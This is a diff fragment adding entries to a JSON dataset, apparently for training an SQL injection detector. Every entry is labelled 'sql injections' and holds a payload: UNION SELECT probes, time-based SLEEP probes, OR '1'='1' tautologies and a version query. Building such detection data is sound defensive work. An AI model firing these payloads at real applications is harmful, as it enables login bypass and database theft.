+    },
+    {
+        "content": "1 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1)) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1)))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1))))) AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' OR '1'='1",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1\" OR \"1\"=\"1",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' OR '1'='1'--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1\" OR \"1\"=\"1\"--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' OR '1'='1'#",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1\" OR \"1\"=\"1\"#",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' OR '1'='1'/*",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1\" OR \"1\"=\"1\"/*",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1'OR 1=1--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1\"OR 1=1--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1'OR 1=1#",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1\"OR 1=1#",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1'OR 1=1/*",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1\"OR 1=1/*",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' UNION SELECT @@version--",
+        "type": "sql injections",
+        "label": 1
+    },
+    {
+        "content": "1' AND '1'='1' AND '%'='",
+        "type": "sql injections",
         "label": 1
     },
     {
